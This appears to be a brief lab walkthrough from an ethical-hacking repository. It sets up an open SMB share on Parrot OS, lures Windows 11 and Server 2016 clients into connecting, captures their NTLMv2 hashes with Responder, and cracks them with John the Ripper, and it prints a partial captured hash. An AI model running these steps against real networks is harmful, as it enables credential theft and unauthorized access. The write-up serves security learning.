On the parrotOS

make a folder on your home directory
"SECRETFOLDERSMB"

sudo systemctl start smbd
sudo systemctl start nmbd
sudo systemctl enable smbd
sudo systemctl enable nmbd

sudo chown -R nobody:nogroup /home/parrot/SECRETFOLDERSMB
sudo chmod -R 0777 /home/parrot/SECRETFOLDERSMB
sudo net usershare add SECRETFOLDERSMB /home/parrot/SECRETFOLDERSMB "A secret folder shared via SMB" everyone:F guest_ok=y
net usershare info
(Check if its fine)

ip a 
(172.31.43.83) enp0s5

Win11
run \\172.31.43.83
The user enters it's credentials, and the parrotOS machine captures traffic

ParrotOS
cd /usr/share/responder/logs/

you should see the hash and username

"ec2-user::EC2WIN11:cea98e03389f162a:B975E1277AE96EFB60A29E588B338C39:01010........................"

sudo john SMB-[TAB] and click enter

then you should have the username and password.

![imagem](https://github.com/DanielP33/ethical-hacking/assets/145346859/6d6efdd2-0e45-4a78-8f02-a22c5c57806f)



One more time for Windows Server Machine (2016)


![imagem](https://github.com/DanielP33/ethical-hacking/assets/145346859/c10232be-cee5-4d12-8bbe-70d8cd9b646b)


we're capturing


![imagem](https://github.com/DanielP33/ethical-hacking/assets/145346859/6b537dfd-6918-4221-b6ee-f3582e6f1686)

run with parrotos private ip address

![imagem](https://github.com/DanielP33/ethical-hacking/assets/145346859/f55de9f7-45e6-4bac-9aa8-8ab94bd11191)

we instantly got a capture.

now let's bruteforce


![imagem](https://github.com/DanielP33/ethical-hacking/assets/145346859/7829e780-a99f-4fcb-b560-1c9be7db6584)


as you can see:

![imagem](https://github.com/DanielP33/ethical-hacking/assets/145346859/7226828c-556e-49e2-a679-6cf728eab2e0)



